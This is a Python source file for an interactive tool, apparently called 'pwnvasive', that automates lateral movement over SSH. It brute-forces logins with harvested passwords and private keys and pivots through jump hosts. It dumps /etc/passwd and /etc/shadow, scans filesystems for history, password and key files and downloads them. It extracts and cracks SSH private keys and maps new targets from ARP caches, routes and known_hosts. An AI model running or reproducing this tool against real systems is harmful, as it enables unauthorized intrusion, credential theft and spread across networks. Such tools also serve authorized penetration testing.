#! /usr/bin/env python

import sys
import asyncio
import asyncssh
import json
import argparse
import logging
from aiocmd import aiocmd
from prompt_toolkit.completion import WordCompleter,NestedCompleter
import os
from enum import Enum,auto
import base64
import zlib
import re
from collections import OrderedDict,Counter,defaultdict
from itertools import islice
import functools
import graphviz
from ipaddress import ip_address,ip_network
import pdb

logging.basicConfig()
logging.getLogger("asyncio").setLevel(logging.WARNING)


class States(Enum):
    INVENTORIED = 1
    REACHED = 2
    CONNECTED = 3
    IDENTIFIED = 4
    HARVESTED = 5

async def gather_limited(n, *tasks, return_exceptions=False):
    semaphore = asyncio.Semaphore(n)
    async def _task(t):
        async with semaphore:
            return await t
    return await asyncio.gather(*(_task(t) for t in tasks),
                                return_exceptions=return_exceptions)

class JSONEnc(json.JSONEncoder):
    def default(self, o):
        if hasattr(o, "__json__"):
            return o.__json__()
        return json.JSONEncoder.default(self, o)

class PwnvasiveException(Exception):
    pass
class NoCredsFound(PwnvasiveException):
    def __str__(self):
        return f"{self.__class__.__name__}: no creds found for {self.args[0]}"

class OSNotIdentified(PwnvasiveException):
    pass

class OS(object):
    def __init__(self, node):
        self.node = node

class Linux(OS):
    @property
    def file_list(self):
        return self.node.config.linuxfiles

    async def run(self, cmd):
        sout,serr = await self.node.run(cmd)
        return sout.strip()

    async def get_hostname(self):
        return await self.run("uname -n")
    async def get_os(self):
        return await self.run("uname -o")
    async def get_uid(self):
        return await self.run("id -u")

    async def get_routes(self):
        # too bad ip -j is not supported on busybox :(
        r = await self.run("ip route show")
        routes = []
        synonyms = { "via":"gateway", "src":"prefsrc"}
        flagnames = ["linkdown", "onlink"]
        for l  in r.splitlines():
            flags = []
            route = {"flags":flags}
            w = l.split()
            w.reverse()
            route["dst"] = w.pop()
            while w:
                n = w.pop()
                n = synonyms.get(n, n) # attempt to stay compatible with ip -j
                if n in flagnames:
                    flags.append(n)
                else:
                    route[n] = w.pop()
            routes.append(route)
        return routes

    re_arpcache = re.compile("\(([0-9.]+)\) at ([0-9a-fA-F:]+) .* on ([0-9a-zA-Z]+)")
    async def get_arp_cache(self):
        out = await self.run("arp -an")
        print(out)
        cache = {}
        for l in out.splitlines():
            m = self.re_arpcache.search(l)
            if m:
                ip,mac,iff = m.groups()
                cache[ip] = [mac,iff]
        return cache

    async def get_all(self):
        keys = ["hostname", "os", "uid"]
        vals = await asyncio.gather(*[getattr(self, f"get_{k}")() for k in keys])
        return dict(zip(keys, vals))


    async def collect_logins(self):
        out,_ = await self.node.run("grep -v nologin /etc/passwd;grep -v ':!:' /etc/shadow")
        logins = set(x.split(":")[0] for x in out.splitlines())
        return list(logins)

    re_interesting = re.compile(r"history|pass|shadow|known_host|/id_|\.(xls|key|pub)$")
    async def collect_filenames(self):
        ## XXX Avoid smb and nfs ?
        ## uglier than find -fstype but works with busybox' find
        sout,_ = await self.node.run("awk '$3~/^(ext2|ext3|ext4|overlay|tmpfs|zfs|reiserfs|jfs|btrfs|xfs|minix|vfat|exfat|udf|ntfs|msdos|umsdos)$/{print $2}' /proc/mounts | while read a; do find $a -xdev -size -8k -print0 ; done")
        rawfnames = sout.split("\0")
        pubfiles = [ f for f in rawfnames if f.endswith(".pub") ]
        keyfiles = set([ f[:-4] for f in pubfiles ])
        interesting_files = set([ f for f in rawfnames if self.re_interesting.search(f) ])
        return list(interesting_files|keyfiles)



class Collection(object):
    def __init__(self, store, mapping, lst=None):
        self.mapping = mapping
        self.store = store
        if lst is None:
            lst = []
        keys = [x.key for x in lst]
        if len(set(keys)) != len(keys):
            dups = [k for k,c in collections.Counter(keys).items() if c > 1]
            raise KeyError(f"Duplicate keys: {' '.join(dups)}")
        self.coll = OrderedDict([(x.key,x) for x in lst])
    def to_json(self):
        return list(self.coll.values())
    def __json__(self):
        return self.to_json()
    def __len__(self):
        return len(self.coll)
    def _selector_to_key(self, selector):
        if isinstance(selector, Mapping):
            return selector.key
        else:
            try:
                selector = int(selector)
            except:
                pass
            else:
                try:
                    o = next(islice(self.coll.values(), selector, None))
                    return o.key
                except StopIteration:
                    raise KeyError(selector)
            if type(selector) is str:
                return self.mapping.str2key(selector)
    def __contains__(self, selector):
        try:
            key = self._selector_to_key(selector)
        except KeyError:
            return False
        return key in self.coll
    def __getitem__(self, selector):
        key = self._selector_to_key(selector)
        return self.coll[key]
    def __delitem__(self, selector):
        key = self._selector_to_key(selector)
        obj = self.coll.pop(key)
        self.store.notify(EventDelete(obj))

    def select(self, selector=None):
        if selector in [None, "all", "*"]:
            return list(self.coll.values())
        else:
            return [self[selector]]
    def items(self):
        return self.coll.items()
    def values(self):
        return self.coll.values()
    def keys(self):
        return self.coll.keys()
    def __iter__(self):
        return iter(self.coll.values())
    def add(self, obj):
        if obj in self:
            raise KeyError(f"Object already present")
        self.coll[obj.key] = obj
        self.store.notify(EventCreate(obj))
    def add_batch(self, lst):
        n = 0
        for o in lst:
            if o not in self:
                self.coll[o.key] = o
                self.store.notify(EventCreate(o))
                n += 1
        return n
    def update(self, oldobj, newobj):
        if oldobj not in self:
            raise KeyError(repr(oldobj.key))
        old = self.pop(oldobj)
        old.update(newobj)
        self[newobj] = newobj
        self.store.notify(EventUpdate(newobj))

    def rehash(self):
        self.coll = OrderedDict([(x.key,x) for x in self.coll.values()])

    def __repr__(self):
        return "<Collection: %s>" % ("\n".join(f"{o.key}" for o in self.values()))
    def string_menu(self):
        return "\n".join(f"{i:2}: {o}" for i,o in enumerate(self.values()))


### Mappings

class MappingMeta(type):
    def __new__(cls, name, bases, dct):
        _k = dct.get("_key")
        _f = dct.get("_fields")
        if _k is None:
            if _f:
                _k = (next(islice(_f.keys(), 1)),)
                dct["_key"] = _k
        _kt = dct.get("_keytype")
        if _kt is None and _k is not None:
            _kt = tuple(_f[k][1] for k in _k)
            dct["_keytype"] = _kt
        return super().__new__(cls, name, bases, dct)

class Mapping(object, metaclass=MappingMeta):
    _fields = {}
    _key = None # tuple. If None, metaclass will use the first field of _field.
    _keytype = None # automatically computed from _key and _fields by metaclass
    def __init__(self, config=None, **kargs):
        self.config = config
        self.values = {}
        for f,(v,_) in self._fields.items():
            if type(v) in [list, dict]:
                v = v.copy()
            self.values[f] = kargs.pop(f, v)
    def __getattr__(self, attr):
        if attr in self.values:
            return self.values[attr]
        raise AttributeError(attr)
    def __getitem__(self, item):
        return self.values[item]
    @property
    def key(self):
        return tuple(self.values[x] for x in self._key)
    @classmethod
    def str2key(cls, s):
        return tuple(t(v) for t,v in zip(cls._keytype, s.split(":")))
    @property
    def shortname(self):
        return ":".join(str(self.values.get(k, "")) for k in self._key)
    def update(self, other):
        for f in self._fields:
            if f in other:
                self.values[f] = other[f]
    @classmethod
    def from_json(cls, j, config=None):
        return cls(config=config, **j)
    def to_json(self):
        return self.values
    def __json__(self):
        return self.to_json()
    def __repr__(self):
        return self.summary()
    def summary(self, include=None, exclude=[], other=[]):
        def fmtval(v):
            if type(v) is list:
                return [fmtval(x) for x in v]
            if type(v) is dict:
                return {k:fmtval(v) for k,v in v.items()}
            v = f"{v}".strip()
            if len(v) > 20:
                v = f"{v[:5]}...({len(v)})...{v[-5:]}"
            return v
        r = ", ".join(f"{k}={fmtval(v)}" for k,v in self.values.items()
                      if v is not None and k not in exclude and (include is None or k in include))
        return "<%s>" % (" ".join([r]+other))




class Net(Mapping):
    _fields = {
        "cidr": ("127.0.0.1/32", str),
        "scanned": (False, bool),
    }

class Logins(Mapping):
    _fields = {
        "login": (None, str),
    }

class Passwords(Mapping):
    _fields = {
        "password": (None, str),
    }

class SSHKeys(Mapping):
    _fields = {
        "sshkey": (None, str),
        "origin": (None, str),
    }
    _sshkey = None
    def __init__(self, **kargs):
        super().__init__(**kargs)
        try:
            self._sshkey = asyncssh.import_private_key(self.sshkey)
        except asyncssh.KeyImportError:
            pass
        if self._sshkey is None:
            self.find_passphrase()

    def test_key_passphrase(self, pwd):
        try:
            asyncssh.import_private_key(self.sshkey, passphrase=pwd)
        except asyncssh.KeyEncryptionError:
            return False
        return True


    def find_passphrase(self, passwords=None):
        if passwords is None:
            passwords = [p.password for p in self.config.passwords]
        for p in passwords:
            if self.test_key_passphrase(p):
                found = p
                break
        else:
            return False
        self._sshkey = asyncssh.import_private_key(self.sshkey, found)
        # store decrypted key ; use pkcs1-pem for determinism
        self.values["sshkey"] = self._sshkey.export_private_key(format_name="pkcs1-pem").decode("ascii")
        self.config.sshkeys.rehash()
        self.config.notify(EventUpdate(self))
        return True

    def __repr__(self):
        dec = "encrypted" if self._sshkey is None else "decrypted"
        if self._sshkey:
            h = self._sshkey.get_fingerprint()
            c = self._sshkey.get_comment()
            a = self._sshkey.get_algorithm()
        else:
            h = c = a = "(-)"
        return f"<{dec} ssh key: {a} {h} {c} {self.origin}>"

class LinuxFiles(Mapping):
    _fields = {
        "path": ("", str),
    }
    def __repr__(self):
        return f"<path={self.path}>"

class Node(Mapping):
    _key = ("ip", "port")
    _fields = {
        "ip":                  ("127.0.0.1", str),
        "port":                (22, int),
        "controlled":          (False, bool),
        "hostname":            (None, str),
        "reachable":           (False, bool),
        "jump_host":           (None, str),
        "routes":              ([], list),
        "arp_cache":           ({}, dict),
        "tested_credentials":  ([], list),
        "working_credentials": ([], list),
        "os":                  (None, str),
        "files":               ({}, dict),
    }

    def __init__(self, **kargs):
        super().__init__(**kargs)
        self.state = States.INVENTORIED
        self.session = None
        if self.values.get("os") == "linux":
            self.os = Linux(self)

    def __repr__(self):
        other =[]
        username = self.working_credentials[0].get("username") if self.working_credentials else None
        if username:
            other.append(f"username={username}")
        other.append(f"files={len(self.files)}")
        return self.summary(exclude=["files", "routes", "arp_cache", "tested_credentials", "working_credentials"], other=other)
    @property
    def nodename(self):
        return self.hostname or self.ip


    def ensure(state):
        def deco(func):
            @functools.wraps(func)
            async def wrapped(self, *args, **kargs):
                if self.state.value < state.value:
                    await getattr(self, f"ensure_{state.name}")()
                return await func(self, *args, **kargs)
            return wrapped
        return deco

    def skip_if(state):
        def deco(func):
            @functools.wraps(func)
            async def wrapped(self, *args, **kargs):
                if self.state.value >= state.value:
                    return True
                return await func(self, *args, **kargs)
            return wrapped
        return deco


    @skip_if(States.INVENTORIED)
    async def ensure_INVENTORIED(self):
        pass

    @skip_if(States.REACHED)
    async def ensure_REACHED(self):
        if self.jump_host is None:
            try:
                r,w=await asyncio.open_connection(self.ip, self.port)
            except OSError as e:
                if e.errno == 111:
                    raise Exception(f"Cannot connect to {self.shortname}")
                raise
            w.close()
        else:
            try:
                jh = self.config.nodes[self.jump_host]
            except KeyError:
                raise Exception(f"Jump host not found in node list: {self.jump_host}")
            jhs = await jh.connect()
            try:
                c,s = await jhs.create_connection(asyncssh.SSHTCPSession, self.ip,self.port)
            except asyncssh.ChannelOpenError:
                raise Exception(f"Cannot connect to {self.shortname} from {jh.shortname}")
            c.close()
        self.state = States.REACHED
        if not self.reachable:
            self.values["reachable"] = True
            self.config.notify(EventNodeReached(self))
        return True

    async def _test_creds(self, **creds):
        use_creds = creds.copy()
        ck = use_creds.pop("client_keys",None)
        if ck:
            use_creds["client_keys"] = asyncssh.import_private_key(ck)
        opt = asyncssh.SSHClientConnectionOptions(**use_creds, known_hosts=None)
        if self.jump_host:
            jh = await self.config.nodes[self.jump_host].connect()
        else:
            jh = None
        try:
            sess = await asyncssh.connect(host=self.ip, port=self.port, options=opt, tunnel=jh)
        except Exception as e:
            return creds,False,None
        return creds,True,sess

    @skip_if(States.CONNECTED)
    @ensure(States.REACHED)
    async def ensure_CONNECTED(self):
        if not self.working_credentials:
            c0 = [{"username":l.login} for l in self.config.logins]
            c1 = [{"username":l.login, "password":p.password}
                  for l in self.config.logins for p in self.config.passwords]
            c2 = [{"username":l.login, "client_keys": s.sshkey}
                  for l in self.config.logins for s in self.config.sshkeys if s._sshkey]
            creds = (c for c in c0+c1+c2 if c not in self.tested_credentials)
            res = await asyncio.gather(*[self._test_creds(**c) for c in creds])

            self.tested_credentials.extend([cred for cred,r,_ in res if not r])
            self.working_credentials.extend([cred for cred,r,_ in res if r])
            if self.working_credentials:
                for _,r,sess in res:
                    if r:
                        self.session = sess
                        break
                self.config.notify(EventNodeConnected(self))
            else:
                raise NoCredsFound(self.shortname)
            return None
        else:
            _,_,sess = await self._test_creds(**self.working_credentials[0])
            self.session = sess
        self.state = States.CONNECTED
        return self.session

    @skip_if(States.IDENTIFIED)
    @ensure(States.CONNECTED)
    async def ensure_IDENTIFIED(self):
        if self.os is None:
            r = await self.session.run("uname -o")
            if "linux" in r.stdout.lower():
                self.os = Linux(self)
                self.values["os"] = "linux"
                self.state = States.IDENTIFIED
                self.values["hostname"] = await self.os.get_hostname()
                self.config.notify(EventNodeIdentified(self))
                return True
            else:
                raise OSNotIdentified(f"Could not recognize os [{r.stdout.strip()}]")



    def remember_file(self, path, content):
        c = base64.b85encode(zlib.compress(content)).decode("ascii")
        if path in self.files:
            if self.files[path] == c:
                return
        self.files[path] = c
        self.config.notify(EventNodeFile(self, path=path))

    def recall_file(self, path):
        c = self.files[path]
        return zlib.decompress(base64.b85decode(c.encode("ascii")))

    def iter_files(self):
        for f,c in self.files.items():
            c2 = zlib.decompress(base64.b85decode(c.encode("ascii")))
            yield f,c2

    @ensure(States.CONNECTED)
    async def connect(self):
        return self.session

    @ensure(States.CONNECTED)
    async def run(self, cmd):
        r = await self.session.run(cmd)
        return r.stdout, r.stderr

    @ensure(States.CONNECTED)
    async def glob(self, pattern):
        async with self.session.start_sftp_client() as sftp:
            return await sftp.glob(pattern)

    @ensure(States.CONNECTED)
    async def get(self, path):
        async with self.session.start_sftp_client() as sftp:
            f = await sftp.open(path, "rb")
            content = await f.read()
        self.remember_file(path, content)
        return content


    async def _sftp_get_file(self, sftp, fname):
        f = await sftp.open(fname, "rb")
        content = await f.read()
        self.remember_file(fname, content)
        return content

    @ensure(States.IDENTIFIED)
    async def mget(self, *paths, concurrency=10):
        async with self.session.start_sftp_client() as sftp:
            try:
                lst = await sftp.glob(paths, error_handler=lambda x:None)
            except asyncssh.SFTPNoSuchFile:
                return {}
            filtered_lst = [f for f in lst if f not in self.files]
            contents = await gather_limited(
                concurrency,
                *(self._sftp_get_file(sftp, f) for f in filtered_lst),
                return_exceptions=True)
        d = { k:v for k,v in zip(filtered_lst, contents) if type(v) is bytes }
        return d


    @ensure(States.IDENTIFIED)
    async def collect_files(self):
        lst = [f.path for f in self.os.file_list]
        return await self.mget(*lst)

    @ensure(States.IDENTIFIED)
    async def collect_logins(self):
        return await self.os.collect_logins()

    @ensure(States.IDENTIFIED)
    async def collect_filenames(self):
        return await self.os.collect_filenames()

    @ensure(States.IDENTIFIED)
    async def collect_infos(self):
        return await self.os.get_all()

    @ensure(States.IDENTIFIED)
    async def collect_routes(self):
        routes = await self.os.get_routes()
        self.values["routes"] = routes
        self.config.notify(EventNodeRoute(self))
        return routes

    @ensure(States.IDENTIFIED)
    async def collect_arp_cache(self):
        cache = await self.os.get_arp_cache()
        self.values["arp_cache"] = cache
        self.config.notify(EventNodeARPCache(self))
        return cache





# Hierarchy of events
class Event(object):
    def __init__(self, obj, **kargs):
        self.obj = obj
        self._details = kargs
    def __getattr__(self, attr):
        return self._details[attr]
    def __repr__(self):
        return f"<{self.__class__.__name__}({self.obj.shortname})>"

class EventNewContent(Event):
    pass

class EventCreate(EventNewContent):
    pass

class EventUpdate(EventNewContent):
    pass

class EventNodeReached(EventUpdate):
    pass

class EventNodeConnected(EventUpdate):
    pass

class EventNodeIdentified(EventUpdate):
    pass

class EventNodeNewData(EventUpdate):
    pass

class EventNodeARPCache(EventNodeNewData):
    pass

class EventNodeRoute(EventNodeNewData):
    pass

class EventNodeFile(EventNodeNewData):
    pass

class EventDelete(Event):
    pass


DEFAULT_CONFIG = {
    "meta": { "version": "0.1", },
    "state": {
    },
}

class Config(object):
    _objects = {
        "networks": Net,
        "nodes": Node,
        "logins": Logins,
        "passwords": Passwords,
        "sshkeys": SSHKeys,
        "linuxfiles": LinuxFiles,
    }
    def __init__(self, fname=None, json_=None):
        self.eventq = asyncio.Queue()
        self.callbacks = defaultdict(lambda : defaultdict(set))
        self.fname = fname
        if json_ is not None:
            j = json_
        elif fname and os.path.isfile(fname):
            with open(fname) as f:
                j = json.load(f)
        else:
            j = DEFAULT_CONFIG
        self.config = j
        s = self.config["state"]
        self.objects = {}
        for f,c in self._objects.items():
            self.objects[f] = Collection(self, c, [c.from_json(d, config=self)
                                                   for d in  s.get(f,[])])
        self.dispatcher_task = asyncio.create_task(self.event_dispatcher())

    def __getattr__(self, attr):
        if attr in self.objects:
            return self.objects[attr]
        raise AttributeError(attr)


    def __enter__(self):
        return self
    def __exit__(self, *args):
        self.save()

    def save(self, fname=None):
        if fname is None:
            fname = self.fname
        self.config["state"].update(self.objects)
        with open(fname+".tmp", "w") as f:
            json.dump(self.config, f, indent=4, cls=JSONEnc)
        os.rename(fname+".tmp", fname) # overwrite file only if json dump completed


    def register_callback(self, events, mappings, cb):
        for event in events:
            for mapping in mappings:
                self.callbacks[event][mapping].add(cb)

    def unregister_callback(self, events, mappings, cb):
        for event in events:
            for mapping in mappings:
                self.callbacks[event][mapping].discard(cb)

    def notify(self, event):
        self.eventq.put_nowait(event)

    async def event_dispatcher(self):
        while True:
            event = await self.eventq.get()
            for eventclass in event.__class__.mro():
                for objclass in event.obj.__class__.mro():
                    for cb in self.callbacks[eventclass][objclass]:
                        t = asyncio.create_task(cb(event))

class Link(object):
    async def __init__(self, node):
        self.node = node

class SSH(Link):
    pass


class PwnCLI(aiocmd.PromptToolkitCmd):
    def __init__(self, options):
        self.options = options
        self.cfg = options.config
        self.prompt = "pwnvasive > "
        super().__init__()
        self.sessions = []


    def str2map(self, s):
        try:
            return json.loads(s)
        except json.JSONDecodeError:
            return { k.strip():v.strip()
                     for k,v in [x.strip().split("=",1) for x in s.split(" ")] }


    def do_save(self, fname=None):
        self.cfg.save(fname)


    ########## DEBUG

    def do_eval(self, cmd):
        print(eval(cmd))

    def do_pdb(self):
        pdb.set_trace()


    def do_event_monitor(self, onoff):
        if onoff.lower() in ["on", "1", "true", "ok"]:
            self.cfg.register_callback([Event], [Mapping], self.event_monitor)
        elif onoff.lower() in ["off", "0", "false", "ko"]:
            self.cfg.unregister_callback([Event], [Mapping], self.event_monitor)
        else:
            print("ERROR: syntax: event_monitor {on|off}")

    async def event_monitor(self, event):
        print(f"MONITOR: {event}")


    ########## MANAGE COLLECTIONS AND MAPPINGS

    def do_ls(self, obj=None, selector=None):
        if obj is None:
            print("\n".join(self.cfg.objects))
        else:
            if selector is None:
                print(self.cfg.objects[obj].string_menu())
            else:
                print(self.cfg.objects[obj][selector])

    def _ls_completions(self):
        return WordCompleter(list(self.cfg.objects))


    def do_show(self, obj, selector=None):
        for obj in self.cfg.objects[obj].select(selector):
            print(f"----- {obj.key} -----")
            print(json.dumps(obj.to_json(), indent=4))

    def _show_completions(self):
        return WordCompleter(list(self.cfg.objects))

    def do_add(self, obj, val=""):
        try:
            val = self.str2map(val)
        except:
            print(f"could not parse [{val}]. Should be field=value[,f=v[,...]]")
        else:
            Obj = self.cfg._objects[obj]
            o = Obj(config=self.cfg, **val)
            print(f"adding {o}")
            self.cfg.objects[obj].add(o)

    def _add_completions(self):
        return WordCompleter(list(self.cfg._objects))
#        XXX: fix nested completer
#        print({k: {f:None for f in v._fields} for k,v in self.cfg._objects.items() })
#        return NestedCompleter({k: {f:None for f in v._fields} for k,v in self.cfg._objects.items() })


    def do_update(self, obj, selector, val):
        try:
            val = self.str2map(val)
        except:
            print(f"could not parse [{val}]. Should be field=value[,f=v[,...]]")
            raise

        objs = self.cfg.objects[obj].select(selector)
        for o in objs:
            print(f"Updating {o}")
            for f,(_,t) in o._fields.items():
                if f in val:
                    old = o.values.get(f,None)
                    new_ = t(val[f])
                    print(f"  + {f}: {old} --> {new_}")
                    o.values[f] = new_
        self.cfg.objects[obj].rehash()

    def do_del(self, obj, selector):
        objs = self.cfg.objects[obj]
        for o in objs.select(selector):
            print(f"deleting {obj} {o.key}")
            del(objs[o])

    def _del_completions(self):
        return WordCompleter(list(self.cfg._objects))



    def do_cat(self, selector, pth):
        nodes = self.cfg.nodes.select(selector)
        for node in nodes:
            try:
                c = node.recall_file(pth)
            except KeyError:
                pass
            else:
                print("----- {node.shortname} -----")
                print(c)

    ########## CNX

    async def do_cnx(self, selector=None):
        if selector is None:
            for n in self.cfg.nodes:
                if n.session:
                    print(n.session)
        else:
            nodes = self.cfg.nodes.select(selector)
            for node in nodes:
                print(f"connecting to {node}")
                cnx = node.connect()
                t = asyncio.create_task(cnx)
                t.add_done_callback(self.cb_connected)

    def cb_connected(self, t):
        try:
            nsession = t.result()
        except NoCredsFound as e:
            print(f"Connection failed: {e}")
        else:
            if nsession:
                print(f"Connected to {nsession} (#{len(self.sessions)})")
                self.sessions.append(nsession)


    ########## RUN

    async def do_run(self, selector, cmd):

        async def run_and_print(node, cmd):
            try:
                sout,serr = await node.run(cmd)
            except Exception as e:
                print(f"-----[{node.shortname}]-----[ERROR]-----")
                print(e)
            else:
                print(f"-----[{node.shortname}]-----")
                print(sout)

        nodes = self.cfg.nodes.select(selector)
        res = await asyncio.gather(*[run_and_print(node, cmd) for node in nodes])


    ######### HARVEST

    async def do_info(self, selector):
        nodes = self.cfg.nodes.select(selector)
        async def print_info(node):
            try:
                nfo = await node.collect_infos()
            except Exception as e:
                res = e
            else:
                res = json.dumps(nfo, indent=4)
            print(f"------[{node.shortname}]------")
            print(res)
        await asyncio.gather(*[print_info(node) for node in nodes])


    async def do_collect_logins(self, selector):
        nodes = self.cfg.nodes.select(selector)
        for node in nodes:
            t = asyncio.create_task(node.collect_logins())
            t.add_done_callback(lambda ctx: self.cb_collect_logins(node, ctx))

    def cb_collect_logins(self, node, t):
        logins = t.result()
        olog = [self.cfg.logins.mapping(config=self.cfg, login=l) for l in logins]
        nlog = self.cfg.logins.add_batch(olog)
        opwd = [self.cfg.passwords.mapping(config=self.cfg, password=l) for l in logins]
        npwd = self.cfg.passwords.add_batch(opwd)
        print(f"{node.shortname}: {nlog} new logins, {npwd} new passwords")


    async def do_collect_filenames(self, selector):
        nodes = self.cfg.nodes.select(selector)
        for node in nodes:
            t = asyncio.create_task(node.collect_filenames())
            t.add_done_callback(lambda ctx:self.cb_collect_filenames(node, ctx))

    def cb_collect_filenames(self, node, t):
        fnames = t.result()
        coll = node.os.file_list
        fnameobjects = [coll.mapping(config=self.cfg, path=p) for p in fnames]
        newfilesnb = coll.add_batch(fnameobjects)
        print(f"{node.shortname}: retrieved {len(fnames)} file names. {newfilesnb} were new.")



    async def do_collect_files(self, selector):
        nodes = self.cfg.nodes.select(selector)
        for node in nodes:
            t = asyncio.create_task(node.collect_files())
            t.add_done_callback(lambda ctx: self.cb_collect_files(node, ctx))

    def cb_collect_files(self, node, t):
        files = t.result()
        print(f"{node.shortname}: retrieved {len(files)} new files")


    async def do_collect_routes(self, selector):
        nodes = self.cfg.nodes.select(selector)
        for node in nodes:
            t = asyncio.create_task(node.collect_routes())
            t.add_done_callback(lambda ctx: self.cb_collect_routes(node, ctx))

    def cb_collect_routes(self, node, t):
        routes = t.result()
        print(f"{node.shortname}: retrieved {len(routes)} routes")


    async def do_collect_arp_cache(self, selector):
        nodes = self.cfg.nodes.select(selector)
        for node in nodes:
            t = asyncio.create_task(node.collect_arp_cache())
            t.add_done_callback(lambda ctx: self.cb_collect_arp_cache(node, ctx))

    def cb_collect_arp_cache(self, node, t):
        cache = t.result()
        print(f"{node.shortname}: retrieved {len(cache)} cache entries")



    ########## EXTRACT
    re_key = re.compile(b"(-----BEGIN ([A-Z0-9 _]*?)PRIVATE KEY-----.*?\n-----END \\2PRIVATE KEY-----)",
                        re.DOTALL)
    def do_extract_sshkeys(self, selector):
        keys = []
        nodes = self.cfg.nodes.select(selector)
        for node in nodes:
            for pth,c in node.iter_files():
                for k,_ in self.re_key.findall(c):
                    try:
                        k = k.decode("ascii")
                    except:
                        continue
                    key = SSHKeys(config=self.cfg, sshkey=k, origin=f"{node.shortname}:{pth}")
                    keys.append(key)
        n = self.cfg.sshkeys.add_batch(keys)
        print(f"{n} new potential ssh keys discovered")

    def do_decrypt_sshkeys(self, selector=None):
        keys = self.cfg.sshkeys.select(selector)
        n = 0
        for k in keys:
            if k._sshkey is None:
                if k.find_passphrase():
                    n += 1
                    print(k)
        print(f"Decrypted {n} ssh keys")

    def do_extract_networks(self, selector=None):
        nodes = self.cfg.nodes.select(selector)
        extnets = []
        extnodes = []
        for node in nodes:
            # Extract from arp cache
            for e in node.arp_cache:
                extnodes.append(Node(config=self.cfg, ip=e))
            # Extract from routes
            for r in node.routes:
                dst = r.get("dst")
                if dst and dst != "default":
                    extnets.append(Net(config=self.cfg, cidr=dst))
                gw = r.get("gateway")
                if gw:
                    extnodes.append(Node(config=self.cfg, ip=gw))
            # Extract from known hosts:
            for pth in node.files:
                if pth.endswith("known_hosts"):
                    try:
                        c = node.recall_file(pth).decode("ascii")
                    except UnicodeDecodeError:
                        continue
                    print(c)
                    kh = asyncssh.import_known_hosts(c)
                    for h in kh._exact_entries.keys():
                        extnodes.append(Node(config=self.cfg, ip=h))
        nnets = self.cfg.networks.add_batch(extnets)
        nnodes = self.cfg.nodes.add_batch(extnodes)
        print(f"Added {nnets} new networks and {nnodes} new nodes")


    ########## COMPUTE

    def do_compute_network(self):
        netgraph = defaultdict(set)
        remotes = defaultdict(set)
        ip2name = {}
        for node in self.cfg.nodes:
            for r in node.routes:
                src = r.get("prefsrc")
                if src:
                    ip2name[src] = node.nodename
        for node in self.cfg.nodes:
            devs = defaultdict(set)
            for r in node.routes:
                src = r.get("prefsrc")
                if r.get("scope") == "link":
                    dev = r.get("dev")
                    dst = r.get("dst")
                    if dst == "default":
                        dst = "0.0.0.0/0"
                    if dev and dst and "/" in dst:
                        devs[dev].add(dst)
            for r in node.routes:
                scope = r.get("scope")
                dst = r.get("dst")
                if dst == "default":
                    dst = "0.0.0.0/0"
                gw = r.get("gateway")
                dev = r.get("dev")
                if gw:
                    if dev in devs:
                        for net in devs[dev]:
                            if ip_address(gw) in ip_network(net):
                                netgraph[net].add(ip2name.get(gw, gw))
                    if dst:
                        remotes[dst].add(ip2name.get(gw,gw))
                else:
                    if dst  and scope == "link":
                        netgraph[dst].add(node.nodename)

        g = graphviz.Graph()
        g.attr("graph", layout="neato")
        g.attr("graph", overlap="scale")

        g.attr("node", shape="ellipse", fillcolor="lightgray", style="filled")
        for net in set(netgraph)|set(remotes):
            if "/" in net:
                g.node(net)
        g.attr("node", shape="box", fillcolor="#eeee33", style="filled")
        for node in {n for ns in netgraph.values() for n in ns}:
                g.node(node)
        g.attr("edge", style="solid")
        for net,nodes in netgraph.items():
            for node in nodes:
                g.edge(net,node)

        g.attr("edge", style="dashed")
        for net,nodes in remotes.items():
            for node in nodes:
                g.edge(net,node)



        print(g.source)
        g.render(view=True)

async def main(args=None):
    parser = argparse.ArgumentParser()
    parser.add_argument("database")

    options = parser.parse_args(args)

    try:
        with Config(options.database) as options.config:
            await PwnCLI(options).run()
    except Exception as e:
        print(f"ERROR: {e}")
        print("You can still recover data from options.config.nodes, etc.")
        sys.last_traceback = e.__traceback__
        pdb.pm()


if __name__ == "__main__":
    asyncio.run(main())
